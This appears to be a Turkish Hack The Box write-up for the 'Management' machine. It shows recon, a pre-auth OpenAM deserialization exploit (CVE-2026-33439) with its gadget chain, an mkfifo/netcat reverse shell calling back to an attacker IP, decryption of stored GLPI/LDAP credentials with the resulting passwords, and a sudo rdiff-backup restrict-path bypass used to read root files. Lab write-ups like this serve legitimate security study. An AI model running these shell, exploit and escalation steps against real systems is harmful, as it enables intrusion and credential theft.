@@ -1,0 +1,187 @@
+## Keşif
+
+### Port Taraması
+
+```bash
+nmap -sC -sV -p- --min-rate 5000 -T4 ip
+```
+
+```
+PORT      STATE SERVICE   VERSION
+22/tcp    open  ssh       OpenSSH 9.x
+80/tcp    open  http      nginx 1.24.0
+443/tcp   open  https     nginx 1.24.0
+1689/tcp  open  java-rmi  Java RMI
+4444/tcp  open  ssl/ldap  OpenDJ 5.0.3
+34483/tcp open  java-rmi  Java RMI
+50389/tcp open  ldap      OpenDJ (Anonim bağlantı açık)
+```
+
+443 portundaki TLS sertifikasına bakınca `management.htb` ve `*.management.htb` wildcard domain'i görüyoruz. İkisini de `/etc/hosts`'a ekledik.
+
+### Web Keşfi
+
+80 portu direk HTTPS'e yönlendiriyor. `https://management.htb` adresinde "Management Managed Services Ltd" firmasının statik tanıtım sayfası var, burada bir şey yok.
+
+SSL sertifikasında `sso.management.htb` de gözüküyor. Onu da `/etc/hosts`'a ekleyip ziyaret edince karşımıza **OpenAM 16.0.5** login sayfası çıkıyor.
+
+ffuf ile vhost taraması yapınca `ad`, `meet`, `glpi` gibi subdomainler geliyor ama hepsi ana siteye 301 ile yönlendiriyor. Port 50389'da anonim LDAP bağlantısı açık ama `dc=management,dc=htb` altında anonim olarak okunabilir bir şey yok.
+
+---
+
+## İlk Erişim — CVE-2026-33439
+
+### Açık Nedir?
+
+OpenAM 16.0.5, **CVE-2026-33439** adlı pre-auth Java deserialization açığına sahip. Kısa özet: CVE-2021-35464 sonrasında `jato.pageSession` parametresi için whitelist koruması eklenmişti ama aynı düzeltme `jato.clientSession` parametresine hiç uygulanmamış. Bu parametre `ClientSession.deserializeAttributes()` → `Encoder.deserialize()` → `ApplicationObjectInputStream.readObject()` yolunu takip ediyor ve hiçbir class filtresi yok.
+
+`<jato:form>` tagı içeren herhangi bir JATO ViewBean sayfasına bu parametreyi gönderince deserialization tetikleniyor. Şifre sıfırlama sayfaları (`/openam/ui/PWResetUserValidation`, `/openam/ui/PWResetQuestion`) kimlik doğrulaması gerektirmeden erişilebilir ve güzel çalışıyor.
+
+### Gadget Chain
+
+Exploit, OpenAM WAR'ının içinde zaten gelen sınıfları kullandığı için hedefte ekstra bir bağımlılık gerekmiyor:
+
+```
+PriorityQueue.readObject()
+  → Column$ColumnComparator.compare()         [openam-core-16.0.5.jar]
+    → Column.getProperty("outputProperties")
+      → PropertyUtils.getValue()              [openam-core-16.0.5.jar]
+        → TemplatesImpl.getOutputProperties() [xalan-2.7.3.jar]
+          → TransletClassLoader.defineClass(bytecode)
+            → EvilTranslet.<clinit>()
+              → Runtime.getRuntime().exec(cmd)
+```
+
+### Payload Hazırlama
+
+[TheMalwareGuardian/CVE-2026-33439](https://github.com/TheMalwareGuardian/CVE-2026-33439) reposundaki PoC'u kullandım, gerekli JAR dosyalarını indirdim. `EvilTranslet.java`'yı Java 17 hedefli derledim (`--release 17`), ardından `PayloadBuilder.java` ile gadget chain'i serialize edip URL-safe base64'e çevirdim.
+
+`bash -i >& /dev/tcp/...` syntax'ı `Runtime.exec` üzerinden sorunluydu, o yüzden klasik mkfifo yöntemine geçtim:
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.x 6666 >/tmp/f
+```
+
+Payload'ı GET parametresi olarak gönderdim:
+
+```
+GET /openam/ui/PWResetUserValidation?jato.clientSession=<base64_payload>
+```
+
+```bash
+nc -lvnp 6666
+# bağlantı geldi
+connect to [10.10.14.x] from 10.129.106.135
+openam@management:/$
+```
+
+`openam` kullanıcısı olarak shell aldık.
+
+---
+
+## Yanal Hareket — GLPI → owen
+
+### GLPI Veritabanı Bilgileri
+
+`openam` shell'iyle dosya sistemini kurcalarken `/opt/glpi` dizininde GLPI kurulu olduğunu gördüm. Veritabanı config dosyası okunabilir durumda:
+
+```bash
+cat /opt/glpi/config/config_db.php
+```
+
+```php
+class DB extends DBmysql {
+   public $dbhost     = '127.0.0.1';
+   public $dbuser     = 'glpi';
+   public $dbpassword = '8rhu0L6Pw4Y7';
+   public $dbdefault  = 'glpidb';
+}
+```
+
+### LDAP Şifresini Çözme
+
+GLPI, LDAP bind şifrelerini `glpi_authldaps` tablosunda XChaCha20-Poly1305 ile şifrelenmiş olarak tutuyor. Şifreleme anahtarı `/opt/glpi/config/glpicrypt.key` dosyasında.
+
+Önce veritabanından şifreli değeri çektim:
+
+```bash
+mysql -u glpi -p'8rhu0L6Pw4Y7' glpidb -e \
+  "SELECT rootdn_passwd FROM glpi_authldaps LIMIT 1;" 2>/dev/null
+```
+
+Sonra PHP'nin sodium kütüphanesiyle çözdüm (GLPI de aynısını kullanıyor):
+
+```bash
+php -r "
+  \$key        = file_get_contents('/opt/glpi/config/glpicrypt.key');
+  \$ciphertext = base64_decode('<veritabanından gelen değer>');
+  \$nonce      = substr(\$ciphertext, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
+  \$data       = substr(\$ciphertext, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
+  echo sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(\$data, \$nonce, \$nonce, \$key) . PHP_EOL;
+"
+```
+
+Çıkan şifre: `WpczC40GhTbk`
+
+### SSH ile owen Kullanıcısına Geçiş
+
+```bash
+ssh *@10.129.106.135
+# Şifre: *
+```
+
+Oldu. User flag:
+
+```bash
+*@management:~$ cat user.txt
+*
+```
+
+---
+
+## Yetki Yükseltme — rdiff-backup sudo
+
+### Sudo İzinleri
+
+```bash
+sudo -l
+```
+
+```
+User owen may run the following commands on management:
+    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
+```
+
+`owen` kullanıcısı `rdiff-backup`'ı root olarak çalıştırabiliyor ama yalnızca server modunda, `/opt/backup` kısıtlamasıyla ve sadece okuma izniyle.
+
+### Bypass
+
+`rdiff-backup`, `--remote-schema` seçeneğiyle istemcinin uzak sunucu sürecini nasıl başlatacağını belirlemene izin veriyor. `%s` yer tutucusu uzak path ile değiştiriliyor, uzak konum formatı ise `hostname::path` şeklinde.
+
+Hostname olarak `/` verince istemci şu komutu çalıştırıyor:
+
+```
+sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path /
+```
+
+İkinci `--restrict-path /` birincisini eziyor ve root sürecinin tüm dosya sistemine erişmesinin önü açılıyor.
+
+```bash
+mkdir -p /tmp/loot
+rdiff-backup \
+  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' \
+  /::/root \
+  /tmp/loot
+```
+
+```bash
+cat /tmp/loot/root.txt
+*
+```
+
+---
+## Kaynaklar
+
+- [CVE-2026-33439 Güvenlik Duyurusu](https://github.com/OpenIdentityPlatform/OpenAM/security/advisories/GHSA-2cqq-rpvq-g5qj)
+- [TheMalwareGuardian/CVE-2026-33439 PoC](https://github.com/TheMalwareGuardian/CVE-2026-33439)
+- [rdiff-backup Dokümantasyonu](https://rdiff-backup.net/docs/rdiff-backup.1.html)
